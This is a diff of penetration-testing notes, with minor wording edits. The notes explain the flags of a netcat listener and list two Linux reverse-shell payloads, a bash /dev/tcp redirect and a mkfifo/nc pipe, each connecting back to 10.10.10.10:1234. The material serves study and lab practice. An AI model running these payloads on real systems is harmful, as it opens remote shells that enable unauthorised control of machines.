@@ -15,7 +15,7 @@ nc -lvnp <port-number>
 
 -l stands for listen, v is for verbose so netcat will print outpur updating us on the state of the connection, n blocks DNS resolution so our machine doesnt try to connect to a DNS server and translate the incoming ip to a domain name and waste time, and p allows you to specify a port.
 
-Commands to run on target machine:
+payloads to run on target machine:
 
 lunix shells:
 ``` bash
@@ -23,7 +23,7 @@ lunix shells:
 	bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
 ```
 
-	or
+or
 
 ``` bash
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
